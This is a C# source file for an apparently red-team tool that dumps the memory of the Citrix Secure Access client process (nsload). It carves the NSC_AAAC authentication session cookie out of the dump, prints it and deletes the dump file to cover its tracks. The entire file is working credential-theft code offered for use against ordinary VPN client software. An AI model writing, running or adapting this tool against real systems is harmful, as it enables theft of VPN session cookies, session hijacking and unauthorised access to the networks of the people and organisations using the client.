using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;
using System.Text.RegularExpressions;

namespace CitrixSecureAccessCredsDump
{
    class Program
    {     // minidump ref https://github.com/3xpl01tc0d3r/Minidump
        // This is for reference.
        public static class MINIDUMP_TYPE
        {
            public const int MiniDumpNormal = 0x00000000;
            public const int MiniDumpWithDataSegs = 0x00000001;
            public const int MiniDumpWithFullMemory = 0x00000002;
            public const int MiniDumpWithHandleData = 0x00000004;
            public const int MiniDumpFilterMemory = 0x00000008;
            public const int MiniDumpScanMemory = 0x00000010;
            public const int MiniDumpWithUnloadedModules = 0x00000020;
            public const int MiniDumpWithIndirectlyReferencedMemory = 0x00000040;
            public const int MiniDumpFilterModulePaths = 0x00000080;
            public const int MiniDumpWithProcessThreadData = 0x00000100;
            public const int MiniDumpWithPrivateReadWriteMemory = 0x00000200;
            public const int MiniDumpWithoutOptionalData = 0x00000400;
            public const int MiniDumpWithFullMemoryInfo = 0x00000800;
            public const int MiniDumpWithThreadInfo = 0x00001000;
            public const int MiniDumpWithCodeSegs = 0x00002000;
        }


        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static int Search(byte[] src, byte[] pattern, int start)
        {
            int maxFirstCharSlot = src.Length - pattern.Length + 1;
            for (int i = start; i < maxFirstCharSlot; i++)
            {
                if (src[i] != pattern[0]) // compare only first byte
                    continue;

                // found a match on first byte, now try to match rest of the pattern
                for (int j = pattern.Length - 1; j >= 1; j--)
                {
                    if (src[i + j] != pattern[j]) break;
                    if (j == 1) return i;
                }
            }
            return -1;
        }

        [Obsolete] // but we don't care
        static void Main(string[] args)
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with HIGH integrity.");
            }
            else
            {
                Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
            }

            Process[] process = Process.GetProcessesByName("nsload");

            if (process.Length > 0)
            {
                for (int i = 0; i < process.Length; i++)
                {
                    Console.WriteLine($"[+] Dumping {process[i].ProcessName} process");
                    Console.WriteLine($"[+] {process[i].ProcessName} process handler {process[i].Handle}");
                    Console.WriteLine($"[+] {process[i].ProcessName} process id {process[i].Id}");
                    Dump(process[i].Handle, (uint)process[i].Id, process[i].ProcessName);
                }
            }
            else
            {
                Console.WriteLine($"[+] process is not running.");
            }
            Console.WriteLine($"\nPress any key to exit.");
            Console.ReadKey();
        }

        [Obsolete] //but working :)
        private static void Dump(IntPtr processhandle, uint processId, string processname)
        {
            try
            {
                bool status;
                string filename = processname + "_" + processId + ".dmp";

                using (FileStream fs = new FileStream(filename, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
                {
                    status = MiniDumpWriteDump(processhandle, processId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                }
                if (status)
                {
                    Console.WriteLine($"[+] {processname} process dumped successfully and saved at {Directory.GetCurrentDirectory()}\\{filename}");
                    ExtractAuthCookie(filename);
                }
                else
                {
                    Console.WriteLine("Cannot Dump the process");
                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                }
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.Message);
            }
        }
        private static void ExtractAuthCookie(string dumpPath)
        {
            //cookie is 65 alph char long 65e1eea386a61ff6beb47baac90ed6fd03d7211cb45525d5f4f58455e445a4a42 
            Console.WriteLine($"[+] Parcessing dump...");
            byte[] fileContent = File.ReadAllBytes(dumpPath);
            byte[] bytes = Encoding.ASCII.GetBytes("NSC_AAAC=");
            string pattern = @"[a-z0-9]{65}";
            Regex rg = new Regex(pattern);
            int start = -1;
            start = Search(fileContent, bytes, 0);
            for (int i = 0; i < fileContent.Length; i++)
            {
                var newArr = fileContent.Skip(start + 9).Take(65).ToArray();
                string s = Encoding.UTF8.GetString(newArr, 0, newArr.Length);
                start = Search(fileContent, bytes, start + 9);
                if (rg.Match(s).Success)
                {
                    Console.WriteLine($"[+] Auth Cookie found : NSC_AAAC={s}");
                    break;
                }
                else
                {
                    Console.WriteLine($"[+] Occurence {i} of NSC_AAAC doesn't look valid, checking next.");
                }
                if (start == -1)
                {
                    Console.WriteLine($"[-] Nothing found.");
                    break;
                }
            }
            Clean(dumpPath);
        }

        private static void Clean(string dumpPath)
        {
            try
            {
                Console.WriteLine($"[+] Cleaning created file.");
                File.Delete(dumpPath);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Something went wrong when deleting {dumpPath}. {e.Message}");
            }
        }
    }
}
